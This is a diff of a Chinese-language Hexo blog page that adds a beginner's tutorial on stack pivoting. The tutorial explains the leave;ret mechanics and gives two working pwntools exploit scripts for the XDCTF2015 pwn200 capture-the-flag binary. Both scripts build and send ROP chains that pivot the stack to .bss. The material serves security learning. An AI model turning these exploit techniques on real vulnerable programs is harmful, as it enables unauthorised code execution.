@@ -85,7 +85,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="二进制安全," />
 
 
 
@@ -96,18 +96,28 @@
 
 
 
-<meta name="description" content="EM7hoWJKpi">
-<meta name="keywords" content="bey0ndm3">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Caps&#39;s Blog">
-<meta property="og:url" content="http://1234xxh.github.io/baidu_verify_EM7hoWJKpi.html">
+<meta name="description" content="举头望明月，低头思故乡">
+<meta name="keywords" content="二进制安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="看懂栈迁移">
+<meta property="og:url" content="http://1234xxh.github.io/2020/09/27/1/index.html">
 <meta property="og:site_name" content="Caps&#39;s Blog">
-<meta property="og:description" content="EM7hoWJKpi">
+<meta property="og:description" content="举头望明月，低头思故乡">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-11-03T16:42:12.000Z">
+<meta property="og:image" content="http://1234xxh.github.io/image/N2LL/18.jpg">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200927/image.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200927/image1.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200927/image2.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200927/image3.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200927/image4.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200927/image5.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200927/image6.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200927/image7.png">
+<meta property="og:updated_time" content="2020-09-27T09:05:10.726Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Caps&#39;s Blog">
-<meta name="twitter:description" content="EM7hoWJKpi">
+<meta name="twitter:title" content="看懂栈迁移">
+<meta name="twitter:description" content="举头望明月，低头思故乡">
+<meta name="twitter:image" content="http://1234xxh.github.io/image/N2LL/18.jpg">
 
 
 
@@ -137,13 +147,13 @@
 
 
 
-  <link rel="canonical" href="http://1234xxh.github.io/baidu_verify_EM7hoWJKpi.html"/>
+  <link rel="canonical" href="http://1234xxh.github.io/2020/09/27/1/"/>
 
 
 
 
 
-  <title> | Caps's Blog</title>
+  <title>看懂栈迁移 | Caps's Blog</title>
   
 
 
@@ -294,33 +304,257 @@
 
   <div id="posts" class="posts-expand">
     
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://1234xxh.github.io/2020/09/27/1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="bey0ndm3">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/background.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Caps's Blog">
+    </span>
+
     
-    
-    <div class="post-block page">
       <header class="post-header">
 
-	<h1 class="post-title" itemprop="name headline"></h1>
-
-
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
         
         
-          EM7hoWJKpi
+          <h1 class="post-title" itemprop="name headline">看懂栈迁移</h1>
         
-      </div>
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-09-27T16:34:14+08:00">
+                2020-09-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/09/27/1/" class="leancloud_visitors" data-flag-title="看懂栈迁移">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
       
+
+      
+        <p>举头望明月，低头思故乡</p>
+<p><img src="/image/N2LL/18.jpg" alt="image"><br><a id="more"></a></p>
+<h1 id="0x01-原因"><a href="#0x01-原因" class="headerlink" title="0x01 原因"></a>0x01 原因</h1><blockquote>
+<p>由于原来溢出空间大小不足以承载payload，因此栈迁移就诞生了，解决溢出空间不足的问题。<br>比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int vuln()&#123;</span><br><span class="line">    char buf[80];</span><br><span class="line">    return read(0, buf, 100);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>上面这个例子的溢出空间是0x14，不足以承载我们构造的payload，既然空间不足，我们就创造一个空间足够大的新的栈空间。</p>
+</blockquote>
+<h1 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h1><blockquote>
+<p>这是一个递进的过程。<br>首先怎么识别我们构造的栈是一个新的栈空间呢？<br>那就需要ESP和EBP来配合，EBP和ESP之间的内存单元就是程序可识别的栈空间。<br>那么怎么让ESP和ESP去指向新的栈空间呢？<br>基于栈溢出，我们能够知道，在栈溢出中，影响到的寄存器中有EBP，ESP，那么我们就可以通过构造payload来实现ESP和ESP的值。<br>关键指令：<br>一、在存在溢出漏洞的函数中，它的倒数第两条指令是leave，也就是move esp, ebp; pop ebp，这就可以改变EBP的值。<br>二、还是上面那一条命令，leave=&gt;move esp, ebp; pop ebp，这个也可以通过ebp的值来改变esp的值。<br>下面我们看一下具体的利用过程：</p>
+</blockquote>
+<blockquote>
+<p><img src="/image/20200927/image.png" alt="image"><br>执行move esp, ebp，使得esp指向1处，然后执行pop ebp;此时ebp寄存器就会执行fake_ebp<br><img src="/image/20200927/image1.png" alt="image"><br>执行ret时，eip执行read函数，此时就会执行read函数，我们传入一个fake_ebp_2的十六进制（这个是作为栈底地址），此时在fake_ebp地址处（ESP指向地址）的值为fake_ebp_2。<br><img src="/image/20200927/image2.png" alt="image"><br>read函数执行返回后执行leave_ret命令，这里可以分为三个命令来执行。<br>3-1时，EBP和ESP都指向了fake_ebp的位置<br>3-2时，EBP指向了fake_ebp_2，这里就是栈底了，ESP指向下一个内存单元，也就是ret_addr处<br>3-3时，ESP继续指向下一个内存单元，EIP的值就是ret_addr的值。<br>此时栈迁移就完毕了，我们就可以在一个新的栈里面构造payload了，通过上述可以发现，我们可以3-3的部分入手进行利用，通过2处的read函数写入满足条件的payload就可以执行命令。</p>
+</blockquote>
+<h1 id="0x03-实现方式"><a href="#0x03-实现方式" class="headerlink" title="0x03 实现方式"></a>0x03 实现方式</h1><blockquote>
+<p>以XDCTF2015的pwn200为例子。</p>
+</blockquote>
+<h2 id="one"><a href="#one" class="headerlink" title="one"></a>one</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;deepin-terminal&apos;, &apos;-x&apos;, &apos;sh&apos; ,&apos;-c&apos;]</span><br><span class="line">elf = ELF(&apos;bed0c68697f74e649f3e1c64ff7838b8&apos;)</span><br><span class="line">r = process(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)</span><br><span class="line">rop = ROP(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)</span><br><span class="line"></span><br><span class="line">offset = 108 ## find stack overflow length</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">leave_ret = 0x08048481 ## ROPgadget --binary bed0c68697f74e649f3e1c64ff7838b8  --only &apos;leave|ret&apos;</span><br><span class="line">read_plt = elf.plt[&apos;read&apos;]</span><br><span class="line"></span><br><span class="line">r.recvuntil(&apos;Welcome to XDCTF2015~!\n&apos;)</span><br><span class="line">## stack pivoting to bss segment</span><br><span class="line">## new stack size is 0x800</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">## padding 108 </span><br><span class="line">rop.raw(&apos;a&apos; * offset)</span><br><span class="line">## faker_ebp1</span><br><span class="line">rop.raw(base_stage)</span><br><span class="line">### stack pivoting, set esp = base_stage</span><br><span class="line">rop.raw(flat(read_plt,leave_ret,0, base_stage, 100))</span><br><span class="line">## print rop.dump()</span><br><span class="line">##gdb.attach(r)</span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">## write sh=&quot;/bin/sh&quot;</span><br><span class="line">rop = ROP(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)</span><br><span class="line">sh = &quot;/bin/sh&quot;</span><br><span class="line">rop.raw(base_stage)</span><br><span class="line">rop.write(1, base_stage + 80, len(sh))</span><br><span class="line">rop.raw(&apos;a&apos; * (80 - len(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(&apos;a&apos; * (100 - len(rop.chain())))</span><br><span class="line">##gdb.attach(r)</span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>执行两次fini来到read函数</p>
+</blockquote>
+<p><img src="/image/20200927/image3.png" alt="image"></p>
+<blockquote>
+<p>把payload写到堆栈中，leave;ret，对ebp进行变更</p>
+</blockquote>
+<p><img src="/image/20200927/image4.png" alt="image"></p>
+<blockquote>
+<p>执行payload中的write函数，将fake_ebp_2和write函数写入新的堆栈里面</p>
+</blockquote>
+<p><img src="/image/20200927/image5.png" alt="image"></p>
+<blockquote>
+<p>执行leave;ret，打印出来“/bin/sh”</p>
+</blockquote>
+<p><img src="/image/20200927/image6.png" alt="image"></p>
+<h2 id="the-other"><a href="#the-other" class="headerlink" title="the other"></a>the other</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;deepin-terminal&apos;, &apos;-x&apos;, &apos;sh&apos; ,&apos;-c&apos;]</span><br><span class="line">elf = ELF(&apos;bed0c68697f74e649f3e1c64ff7838b8&apos;)</span><br><span class="line">r = process(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)</span><br><span class="line">rop = ROP(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset = 112</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">leave_ret = 0x08048481</span><br><span class="line">read_plt = elf.plt[&apos;read&apos;]</span><br><span class="line"></span><br><span class="line">r.recvuntil(&apos;Welcome to XDCTF2015~!\n&apos;)</span><br><span class="line">## stack pivoting to bss segment</span><br><span class="line">## new stack size is 0x800</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">### padding</span><br><span class="line">rop.raw(&apos;a&apos; * offset)</span><br><span class="line">### read 100 byte to base_stage</span><br><span class="line">rop.read(0, base_stage, 100)</span><br><span class="line">### stack pivoting, set esp = base_stage</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">## write sh=&quot;/bin/sh&quot;</span><br><span class="line">rop = ROP(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)</span><br><span class="line">sh = &quot;/bin/sh&quot;</span><br><span class="line">rop.write(1, base_stage + 80, len(sh))</span><br><span class="line">rop.raw(&apos;a&apos; * (80 - len(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(&apos;a&apos; * (100 - len(rop.chain())))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/image/20200927/image7.png" alt="image"></p>
+<blockquote>
+<p>这里的区别是，注意看1，2，3处，在3处的时候ebp才变化的，也就是先在新的栈上写完payload，然后才开始执行迁移，注意一下3处，0x804a820与0x804a81c相差4。</p>
+</blockquote>
+<h1 id="0x04-尾记"><a href="#0x04-尾记" class="headerlink" title="0x04 尾记"></a>0x04 尾记</h1><blockquote>
+<p>还未入门，详细记录每个知识点，为了能更好地温故知新，也希望能帮助和我一样想要入门二进制安全的初学者，如有错误，希望大佬们指出。</p>
+</blockquote>
+
       
     </div>
+	<div>
+      
+          <div>
+     
+        <div style="text-align:center;color: #ccc;font-size:15px;">
+              -------------本文结束&感谢您的阅读-------------
+        </div>
+</div>
+      
+	</div>
     
     
     
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    bey0ndm3
+  </li>
+    <li class="post-copyright-author">
+    <strong>Post title:</strong>
+    <a href="/2020/09/27/1/">看懂栈迁移</a>
+  </li>
+  <li class="post-copyright-author">
+    <strong>Publishing time:</strong>
+    2020年09月27日 - 16:09
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="http://1234xxh.github.io/2020/09/27/1/" title="看懂栈迁移">http://1234xxh.github.io/2020/09/27/1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+  <li>转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/二进制安全/" rel="tag"># 二进制安全</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+          <div class="wp_rating">
+            <div id="wpac-rating"></div>
+          </div>
+        
+
+        
+
+        
+          
+          <div id="needsharebutton-postbottom">
+            <span class="btn">
+              <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </span>
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/09/08/1/" rel="next" title="某市HW攻防演练部分总结">
+                <i class="fa fa-chevron-left"></i> 某市HW攻防演练部分总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
   </div>
 
 
@@ -358,8 +592,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -414,6 +657,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-原因"><span class="nav-number">1.</span> <span class="nav-text">0x01 原因</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-原理"><span class="nav-number">2.</span> <span class="nav-text">0x02 原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-实现方式"><span class="nav-number">3.</span> <span class="nav-text">0x03 实现方式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#one"><span class="nav-number">3.1.</span> <span class="nav-text">one</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#the-other"><span class="nav-number">3.2.</span> <span class="nav-text">the other</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-尾记"><span class="nav-number">4.</span> <span class="nav-text">0x04 尾记</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -1134,6 +1393,23 @@
   </script>
 
   
+  <script type="text/javascript">
+  wpac_init = window.wpac_init || [];
+  wpac_init.push({widget: 'Rating', id: 12981,
+    el: 'wpac-rating',
+    color: 'fc6423'
+  });
+  (function() {
+    if ('WIDGETPACK_LOADED' in window) return;
+    WIDGETPACK_LOADED = true;
+    var mc = document.createElement('script');
+    mc.type = 'text/javascript';
+    mc.async = true;
+    mc.src = '//embed.widgetpack.com/widget.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
+  })();
+  </script>
+
 
   
   
